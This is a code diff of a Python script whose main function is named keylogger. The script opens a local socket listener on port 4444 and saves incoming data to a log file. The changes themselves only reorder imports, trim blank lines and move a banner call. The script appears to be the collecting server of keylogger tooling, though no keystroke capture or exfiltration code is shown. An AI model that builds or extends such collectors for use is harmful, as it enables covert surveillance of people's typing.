@@ -1,18 +1,14 @@
+from colorama import Fore, init
+from datetime import datetime
+from pystyle import *
 import socket
 import os
-from datetime import datetime
-
-from pystyle import *
-from colorama import Fore, init
-
 
 Success = Colors.green + "[+]" + Colors.reset
 Error = Colors.red + "[-]" + Colors.reset
 Info = Colors.blue + "[*]" + Colors.reset
 
-
 init(autoreset=True)
-
 
 LOG_FILE = os.path.join('logs', 'app.log')
 
@@ -38,6 +34,8 @@ def save_to_file(data):
 
 
 def keylogger():
+    display_banner()
+    
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind(('127.0.0.1', 4444))
     server.listen(5)
@@ -108,7 +106,6 @@ def display_banner():
 
 
 def main():
-    display_banner()
     keylogger()
 
 
@@ -116,4 +113,5 @@ if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
+
         print(Colors.green + "\nДо свидания!" + Colors.reset)
